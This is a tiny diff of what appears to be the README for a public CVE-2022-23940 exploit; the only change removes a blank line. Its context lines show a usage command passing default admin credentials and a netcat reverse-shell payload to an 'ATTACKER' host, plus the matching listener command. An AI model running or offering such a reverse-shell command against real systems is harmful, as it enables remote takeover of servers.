@@ -32,7 +32,6 @@ python3 exploit.py -h http://TARGET -u admin -p admin -P "nc ATTACKER 80 -e /bin
 nc -nlvp 80
 ```
 
-
 ### References
 
 - https://github.com/manuelz120/CVE-2022-23940
